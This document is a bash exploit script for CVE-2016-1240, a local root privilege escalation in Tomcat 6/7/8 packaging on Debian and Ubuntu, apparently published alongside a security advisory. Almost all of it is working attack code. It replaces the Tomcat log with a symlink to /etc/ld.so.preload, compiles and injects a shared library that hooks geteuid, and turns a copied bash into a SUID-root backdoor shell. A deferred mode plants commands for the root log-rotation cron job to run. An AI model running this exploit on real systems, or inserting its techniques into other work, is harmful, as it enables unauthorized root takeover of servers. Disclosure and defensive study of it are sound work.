#!/bin/bash
#
# Tomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit
#
# CVE-2016-1240
#
# Discovered and coded by:
#
# Dawid Golunski
# http://legalhackers.com
#
# This exploit targets Tomcat (versions 6, 7 and 8) packaging on 
# Debian-based distros including Debian, Ubuntu etc.
# It allows attackers with a tomcat shell (e.g. obtained remotely through a 
# vulnerable java webapp, or locally via weak permissions on webapps in the 
# Tomcat webroot directories etc.) to escalate their privileges to root.
#
# Usage:
# ./tomcat-rootprivesc-deb.sh path_to_catalina.out [-deferred]
#
# The exploit can used in two ways:
#
# -active (assumed by default) - which waits for a Tomcat restart in a loop and instantly
# gains/executes a rootshell via ld.so.preload as soon as Tomcat service is restarted. 
# It also gives attacker a chance to execute: kill [tomcat-pid] command to force/speed up
# a Tomcat restart (done manually by an admin, or potentially by some tomcat service watchdog etc.)
#
# -deferred (requires the -deferred switch on argv[2]) - this mode symlinks the logfile to 
# /etc/default/locale and exits. It removes the need for the exploit to run in a loop waiting. 
# Attackers can come back at a later time and check on the /etc/default/locale file. Upon a 
# Tomcat restart / server reboot, the file should be owned by tomcat user. The attackers can
# then add arbitrary commands to the file which will be executed with root privileges by 
# the /etc/cron.daily/tomcatN logrotation cronjob (run daily around 6:25am on default 
# Ubuntu/Debian Tomcat installations).
#
# See full advisory for details at:
# http://legalhackers.com/advisories/Tomcat-DebPkgs-Root-Privilege-Escalation-Exploit-CVE-2016-1240.html
#
# Disclaimer:
# For testing purposes only. Do no harm.
#

BACKDOORSH="/bin/bash"
BACKDOORPATH="/tmp/tomcatrootsh"
PRIVESCLIB="/tmp/privesclib.so"
PRIVESCSRC="/tmp/privesclib.c"
SUIDBIN="/usr/bin/sudo"

function cleanexit {
	# Cleanup 
	echo -e "\n[+] Cleaning up..."
	rm -f $PRIVESCSRC
	rm -f $PRIVESCLIB
	rm -f $TOMCATLOG
	touch $TOMCATLOG
	if [ -f /etc/ld.so.preload ]; then
		echo -n > /etc/ld.so.preload 2>/dev/null
	fi
	echo -e "\n[+] Job done. Exiting with code $1 \n"
	exit $1
}

function ctrl_c() {
        echo -e "\n[+] Active exploitation aborted. Remember you can use -deferred switch for deferred exploitation."
	cleanexit 0
}

#intro 
echo -e "\033[94m \nTomcat 6/7/8 on Debian-based distros - Local Root Privilege Escalation Exploit\nCVE-2016-1240\n"
echo -e "Discovered and coded by: \n\nDawid Golunski \nhttp://legalhackers.com \033[0m"

# Args
if [ $# -lt 1 ]; then
	echo -e "\n[!] Exploit usage: \n\n$0 path_to_catalina.out [-deferred]\n"
	exit 3
fi
if [ "$2" = "-deferred" ]; then
	mode="deferred"
else
	mode="active"
fi

# Priv check
echo -e "\n[+] Starting the exploit in [\033[94m$mode\033[0m] mode with the following privileges: \n`id`"
id | grep -q tcuser
if [ $? -ne 0 ]; then
	echo -e "\n[!] You need to execute the exploit as tomcat user! Exiting.\n"
	exit 3
fi

# Set target paths
TOMCATLOG="$1"
if [ ! -f $TOMCATLOG ]; then
	echo -e "\n[!] The specified Tomcat catalina.out log ($TOMCATLOG) doesn't exist. Try again.\n"
	exit 3
fi
echo -e "\n[+] Target Tomcat log file set to $TOMCATLOG"

# [ Deferred exploitation ]

# Symlink the log file to /etc/default/locale file which gets executed daily on default
# tomcat installations on Debian/Ubuntu by the /etc/cron.daily/tomcatN logrotation cronjob around 6:25am.
# Attackers can freely add their commands to the /etc/default/locale script after Tomcat has been
# restarted and file owner gets changed.
if [ "$mode" = "deferred" ]; then
	rm -f $TOMCATLOG && ln -s /etc/default/locale $TOMCATLOG
	if [ $? -ne 0 ]; then
		echo -e "\n[!] Couldn't remove the $TOMCATLOG file or create a symlink."
		cleanexit 3
	fi
	echo -e  "\n[+] Symlink created at: \n`ls -l $TOMCATLOG`"
	echo -e  "\n[+] The current owner of the file is: \n`ls -l /etc/default/locale`"
	echo -ne "\n[+] Keep an eye on the owner change on /etc/default/locale . After the Tomcat restart / system reboot"
	echo -ne "\n    you'll be able to add arbitrary commands to the file which will get executed with root privileges"
	echo -ne "\n    at ~6:25am by the /etc/cron.daily/tomcatN log rotation cron. See also -active mode if you can't wait ;)\n\n"
	exit 0
fi

# [ Active exploitation ]

trap ctrl_c INT
# Compile privesc preload library
echo -e "\n[+] Compiling the privesc shared library ($PRIVESCSRC)"
cat <<_solibeof_>$PRIVESCSRC
#define _GNU_SOURCE
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <dlfcn.h>
uid_t geteuid(void) {
	static uid_t  (*old_geteuid)();
	old_geteuid = dlsym(RTLD_NEXT, "geteuid");
	if ( old_geteuid() == 0 ) {
		chown("$BACKDOORPATH", 0, 0);
		chmod("$BACKDOORPATH", 04777);
		unlink("/etc/ld.so.preload");
	}
	return old_geteuid();
}
_solibeof_
gcc -Wall -fPIC -shared -o $PRIVESCLIB $PRIVESCSRC -ldl
if [ $? -ne 0 ]; then
	echo -e "\n[!] Failed to compile the privesc lib $PRIVESCSRC."
	cleanexit 2;
fi

# Prepare backdoor shell
cp $BACKDOORSH $BACKDOORPATH
echo -e "\n[+] Backdoor/low-priv shell installed at: \n`ls -l $BACKDOORPATH`"

# Safety check
if [ -f /etc/ld.so.preload ]; then
	echo -e "\n[!] /etc/ld.so.preload already exists. Exiting for safety."
	cleanexit 2
fi

# Symlink the log file to ld.so.preload
rm -f $TOMCATLOG && ln -s /etc/ld.so.preload $TOMCATLOG
if [ $? -ne 0 ]; then
	echo -e "\n[!] Couldn't remove the $TOMCATLOG file or create a symlink."
	cleanexit 3
fi
echo -e "\n[+] Symlink created at: \n`ls -l $TOMCATLOG`"

# Wait for Tomcat to re-open the logs
echo -ne "\n[+] Waiting for Tomcat to re-open the logs/Tomcat service restart..."
echo -e  "\nYou could speed things up by executing : kill [Tomcat-pid] (as tomcat user) if needed ;)"
while :; do 
	sleep 0.1
	if [ -f /etc/ld.so.preload ]; then
		echo $PRIVESCLIB > /etc/ld.so.preload
		break;
	fi
done

# /etc/ld.so.preload file should be owned by tomcat user at this point
# Inject the privesc.so shared library to escalate privileges
echo $PRIVESCLIB > /etc/ld.so.preload
echo -e "\n[+] Tomcat restarted. The /etc/ld.so.preload file got created with tomcat privileges: \n`ls -l /etc/ld.so.preload`"
echo -e "\n[+] Adding $PRIVESCLIB shared lib to /etc/ld.so.preload"
echo -e "\n[+] The /etc/ld.so.preload file now contains: \n`cat /etc/ld.so.preload`"

# Escalating privileges via the SUID binary (e.g. /usr/bin/sudo)
echo -e "\n[+] Escalating privileges via the $SUIDBIN SUID binary to get root!"
sudo --help 2>/dev/null >/dev/null

# Check for the rootshell
ls -l $BACKDOORPATH | grep rws | grep -q root
if [ $? -eq 0 ]; then 
	echo -e "\n[+] Rootshell got assigned root SUID perms at: \n`ls -l $BACKDOORPATH`"
	echo -e "\n\033[94mPlease tell me you're seeing this too ;) \033[0m"
else
	echo -e "\n[!] Failed to get root"
	cleanexit 2
fi

# Execute the rootshell
echo -e "\n[+] Executing the rootshell $BACKDOORPATH now! \n"
$BACKDOORPATH -p -c "rm -f /etc/ld.so.preload; rm -f $PRIVESCLIB"
$BACKDOORPATH -p

# Job done.
cleanexit 0
